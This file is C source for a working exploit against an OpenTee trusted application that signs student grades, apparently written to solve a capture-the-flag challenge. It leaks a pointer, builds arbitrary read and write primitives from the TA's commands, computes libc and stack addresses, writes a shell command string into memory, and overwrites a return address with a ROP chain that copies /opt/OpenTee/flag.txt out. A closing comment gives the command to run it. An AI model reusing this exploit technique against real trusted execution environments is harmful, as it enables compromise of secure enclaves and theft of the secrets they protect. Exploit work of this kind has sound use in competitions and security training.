/* Exploit for the vulnerable TA */

#include "tee_client_api.h"
#include "grade_ca.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <dlfcn.h>
#include <unistd.h>

void logBody(struct student *s) {
	printf("	firstname: %.16s,\n", s->firstname);
	printf("	lastname: %.16s,\n", s->lastname);
	printf("	grade: %d,\n", s->grade);
	printf("	sciper: %d,\n", s->sciper);
}

void logStudent(struct student *s) {
	printf("Student {\n");
	logBody(s);
	printf("};\n");
}

void logSigned(struct signedStudent *s) {
	printf("SignedStudent {\n");
	logBody((struct student *)s);
	printf("	signature: %.16s,\n", s->signature);
	printf("};\n");
}

static const TEEC_UUID uuid = {
	0x11223344, 0xA710, 0x469E, { 0xAC, 0xC8, 0x5E, 0xDF, 0x8C, 0x85, 0x90, 0xE1 }
};

TEEC_Context context;
TEEC_Session session;
TEEC_Operation operation;
TEEC_SharedMemory in_mem;
TEEC_SharedMemory out_mem;
TEEC_Result tee_rv;
uint32_t origin;

#define CHUNKSIZE 32

TEEC_Result arbitraryRead(long addr, int chunks, uint8_t *dst) {
	for (int i = 0; i < chunks; i++) {
		operation.params[0].value.a = addr;
		operation.params[0].value.b = addr >> 32;
		operation.params[1].tmpref.buffer = out_mem.buffer;
		operation.params[1].tmpref.size = sizeof(struct signedStudent);
		operation.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INPUT, TEEC_MEMREF_TEMP_OUTPUT, TEEC_NONE, TEEC_NONE);

		tee_rv = TEEC_InvokeCommand(&session, 2, &operation, &origin);
		// printf("r: %x\n", tee_rv);
		if (tee_rv == TEE_ERROR_ACCESS_DENIED) {
			return tee_rv;
		}

		memcpy(dst + i * CHUNKSIZE, out_mem.buffer, CHUNKSIZE);
		addr += CHUNKSIZE;
	}
	return TEE_SUCCESS;
}

TEEC_Result arbitraryWrite(long addr, int chunks, uint8_t *src) {
	for (int i = 0; i < chunks; i++) {
		memcpy(in_mem.buffer, src, CHUNKSIZE);
		operation.params[0].tmpref.buffer = in_mem.buffer;
		operation.params[0].tmpref.size = sizeof(struct student);
		operation.params[1].value.a = addr;
		operation.params[1].value.b = addr >> 32;
		operation.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_VALUE_INPUT, TEEC_NONE, TEEC_NONE);

		tee_rv = TEEC_InvokeCommand(&session, 2, &operation, &origin);
		if (tee_rv == TEE_ERROR_ACCESS_DENIED) {
			return tee_rv;
		}

		src += CHUNKSIZE;
		addr += CHUNKSIZE;
	}
	return TEE_SUCCESS;
}

TEEC_Result testAddr(long offset, uint8_t *dst) {
	operation.params[0].tmpref.buffer = in_mem.buffer;
	operation.params[0].tmpref.size = sizeof(struct student);
	operation.params[1].tmpref.buffer = out_mem.buffer;
	operation.params[1].tmpref.size = sizeof(struct signedStudent);
	operation.params[2].value.a = offset;
	operation.params[2].value.b = 0;
	operation.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT, TEEC_VALUE_INPUT, TEEC_NONE);

	tee_rv = TEEC_InvokeCommand(&session, 3, &operation, &origin);
	if (tee_rv == TEE_ERROR_ACCESS_DENIED) {
		return tee_rv;
	}

	memcpy(dst, out_mem.buffer, 32);
	return TEE_SUCCESS;
}

int main()
{
	memset((void *)&in_mem, 0, sizeof(in_mem));
	memset((void *)&operation, 0, sizeof(operation));

	printf("Initializing context: ");
	tee_rv = TEEC_InitializeContext(NULL, &context);
	if (tee_rv != TEEC_SUCCESS) {
		printf("TEEC_InitializeContext failed: 0x%x\n", tee_rv);
		exit(0);
	} else {
		printf("initialized\n");
	}

	/*
	Connect to the TA
	*/
	printf("Openning session: ");
	tee_rv = TEEC_OpenSession(&context, &session, &uuid, TEEC_LOGIN_PUBLIC,
				  NULL, &operation, NULL);
	if (tee_rv != TEEC_SUCCESS) {
		printf("TEEC_OpenSession failed: 0x%x\n", tee_rv);
		exit(0);
	} else {
		printf("opened\n");
	}

	/*
	Setup memory for the input/output classes
	*/
	struct studentclass* StudentClassInst = (struct studentclass*)malloc(sizeof(struct studentclass)); 
	struct signedStudentclass* signedStudentClassInst = (struct signedStudentclass*)malloc(sizeof(struct signedStudentclass)); 
	memset(StudentClassInst, 0, sizeof(struct studentclass));
	memset(signedStudentClassInst, 0, sizeof(struct signedStudentclass));

	for (int i = 0; i < 16; i++) {
		StudentClassInst->students[i].grade = 6;
	}
	memset(StudentClassInst->students[0].firstname, 'A', NAME_LEN-1);
	memset(StudentClassInst->students[0].lastname, 'B', NAME_LEN-1);

	in_mem.buffer = (void*)StudentClassInst;
	in_mem.size = sizeof(struct studentclass);
	in_mem.flags = TEEC_MEM_INPUT;

	/*
	Register shared memory, allows us to read data from TEE or read data from it
	*/
	tee_rv = TEEC_RegisterSharedMemory(&context, &in_mem);
	if (tee_rv != TEE_SUCCESS) {
		printf("Failed to register studentclass shared memory\n");
		exit(0);
	}

	printf("registered shared memory for student class\n");

	out_mem.buffer = (void*)signedStudentClassInst;
	out_mem.size = sizeof(struct signedStudentclass);
	out_mem.flags = TEEC_MEM_OUTPUT;

	tee_rv = TEEC_RegisterSharedMemory(&context, &out_mem);
	if (tee_rv != TEE_SUCCESS) {
		printf("Failed to register signed studentclass memory\n");
		exit(0);
	}

	/*
	@TODO: Implement actual logic to sign student grades.
	*/

	int i = 103;
	long chunk[0x1000] = {0};
	char zeros[32] = {0};
	long leak;
	while (1) {
		testAddr(i, (char *)chunk);
		if (tee_rv != TEE_ERROR_ACCESS_DENIED) {
			leak = chunk[0];
			if (leak >> 40 == 0x7f) {
				printf("leak: %p\n", (void *)leak);
				break;
			}
		}
		i++;
	}

	long linker = leak - 0x2e8af;
	long rt = linker + 0x3a040;
	printf("[+] rt: %p\n", (void *)rt);

	arbitraryRead(rt, 4, (char *)chunk);

	arbitraryRead(chunk[4], 1, (char *)chunk);
	long libc = chunk[0];
	printf("[+] libc: %p\n", (void *)libc);

	long environ = libc + 0x221200;
	arbitraryRead(environ, 1, (char *)chunk);
	environ = chunk[0];

	printf("[+] environ: %p\n", (void *)environ);

	long victim = libc - 0x121000;
	printf("[+] victim: %p\n", (void *)victim);

	long retaddr = victim - 0x1268;
	char command[] = "/bin/sh < /tmp/open_tee_sock\n";
	long bss = libc + 0x21b0a0;
	arbitraryWrite(bss, (sizeof(command) + CHUNKSIZE) / CHUNKSIZE, command);
	printf("[+] command: %p\n", (void *)bss);
	long out = bss + 0x80;
	arbitraryWrite(out, 1, "/opt/OpenTee/flag.txt");
	long pts = bss + 0x100;
	arbitraryWrite(pts, 1, "/tmp/flag");

	fflush(stdout);
	// printf("wait: ");
	fflush(stdout);
	// scanf("%c", (char *)&origin);

	long poprdi = libc + 0x000000000002a3e5;
	long poprax = libc + 0x0000000000045eb0;
	long poprsi = libc + 0x000000000002be51;
	long poprdx = libc + 0x00000000000796a2;
	long poprsp = libc + 0x0000000000035732;
	long syscall = libc + 0x11ab65;
	long ret = poprdi + 1;
	long system = libc + 0x50d70;
	long gets = libc + 0x80520;
	long _open = libc + 0x1146d0;
	long dup2 = libc + 0x115200;
	long splice = libc + 0x1261d0;
	long _read = libc + 0x1149c0;
	long _write = libc + 0x114a60;
	long remoteChain = retaddr - 0x10000;
	long chain[] = {
		poprdi, out,
		poprsi, 0,
		_open,
		poprdi, pts,
		poprsi, 2,
		_open,
		poprdi, 9,
		poprsi, bss,
		poprdx, 0x40,
		_read,
		poprdi, 10,
		poprsi, bss,
		poprdx, 0x40,
		_write,
		poprdi, 16,
		libc + 0xea570,
	};
	if (fork() == 0) {
		while (1) {
			int fd = open("/tmp/flag", O_RDONLY);
			char buffer[64] = {0};
			if (read(fd, buffer, 64)) {
				write(1, buffer, 64);
				write(1, ".\n", 1);
			}
			sleep(1);
		}
	}
	arbitraryWrite(remoteChain, (sizeof(chain) + CHUNKSIZE / CHUNKSIZE), (char *)chain);
	long setup[] = { poprsp, remoteChain };
	// long setup[] = { poprdi, 100, libc + 0xea570 };
	arbitraryWrite(retaddr, (sizeof(setup) + CHUNKSIZE) / CHUNKSIZE, (char *)setup);
	printf("DONE\n");
	exit(0);
}

// touch /tmp/flag && chmod +x exp && LD_LIBRARY_PATH=/opt/OpenTee/lib ./exp && cat /tmp/flag